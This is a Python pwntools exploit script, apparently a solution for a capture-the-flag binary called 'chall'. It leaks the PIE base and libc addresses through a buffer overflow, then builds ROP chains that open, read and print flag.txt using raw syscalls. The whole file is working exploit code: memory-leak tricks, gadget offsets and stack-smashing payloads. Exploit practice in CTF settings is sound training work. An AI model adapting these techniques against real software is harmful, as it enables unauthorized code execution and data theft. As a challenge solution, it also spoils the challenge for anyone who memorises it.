from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b *country
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")
offset = 32

io = start()

io.sendline(b'Diego')
io.sendline(b'20')

# leak pie
io.sendlineafter(b'country', b'4294967296')
io.sendafter(b'name', b'A'*offset)
io.recv()
print_new_name = unpack(io.recvuntil(b' [')[53:59].ljust(8, b'\x00'))

pie_base = print_new_name - 0xd73

print(f"print_new_name @ 0x{print_new_name:x}")
print(f"base           @ 0x{pie_base:x}")

# control return addr
gadget1_addr       = pie_base + elf.symbols.__libc_csu_init + 90
gadget2_addr       = pie_base + elf.symbols.__libc_csu_init + 64
gadget_pop_rdi_ret = 0x0000000000001253 + pie_base
gadget_ret         = 0x000000000000095e + pie_base

print(f"gadget1        @ 0x{gadget1_addr:x}")
print(f"gadget2        @ 0x{gadget2_addr:x}")

io.sendlineafter(b'country', b'4294967296')

payload =  b'A'*offset + b'\x9a'

io.sendafter(b'name', payload)

offset_return_addr = cyclic_find(b'kaaa')

payload  = b'A'*offset_return_addr
payload += flat(gadget_pop_rdi_ret)
payload += flat(elf.got.puts + pie_base)
payload += flat(elf.symbols.puts + pie_base)
payload += flat(elf.symbols.country + pie_base)

io.sendafter(b'country', payload)

io.recv()

puts_leak = unpack(io.recv(6).ljust(8, b'\x00'))
print(f"puts_leak      @ 0x{puts_leak:x}")

libc.address = puts_leak - libc.symbols.puts

print(f"libc base      @ 0x{libc.address:x}")

puntero_flag_txt = pie_base + 0x127a

print(f"flag.txt       @ 0x{puntero_flag_txt:x}")

libc_gadget_pop_rax         = 0x0000000000045eb0 + libc.address
libc_gadget_pop_rdi         = 0x000000000002a3e5 + libc.address
libc_gadget_pop_rdx_pop_r12 = 0x000000000011f497 + libc.address
libc_gadget_syscall         = 0x0000000000091396 + libc.address
libc_gadget_pop_rsi         = 0x000000000002be51 + libc.address
data_addr                   = 0x202060 + pie_base


payload =  b'A' * offset_return_addr
payload += flat(libc_gadget_pop_rax) + flat(2)
payload += flat(libc_gadget_pop_rdi) + flat(puntero_flag_txt)
payload += flat(libc_gadget_pop_rsi) + flat(0)
payload += flat(libc_gadget_pop_rdx_pop_r12) + flat(0) + flat(0)
payload += flat(libc_gadget_syscall)
payload += flat(elf.symbols.country + pie_base)

io.sendafter(b'country', payload)

payload =  b'A' * offset_return_addr
payload += flat(libc_gadget_pop_rax) + flat(0)
payload += flat(libc_gadget_pop_rdi) + flat(3)
payload += flat(libc_gadget_pop_rsi) + flat(data_addr)
payload += flat(libc_gadget_pop_rdx_pop_r12) + flat(200) + flat(0)
payload += flat(libc_gadget_syscall)
payload += flat(elf.symbols.country + pie_base)

io.sendafter(b'country', payload)

payload =  b'A' * offset_return_addr
payload += flat(libc_gadget_pop_rax) + flat(1)
payload += flat(libc_gadget_pop_rdi) + flat(1)
payload += flat(libc_gadget_pop_rsi) + flat(data_addr)
payload += flat(libc_gadget_pop_rdx_pop_r12) + flat(200) + flat(0)
payload += flat(libc_gadget_syscall)
payload += flat(elf.symbols.country + pie_base)

io.sendafter(b'country', payload)
io.interactive()
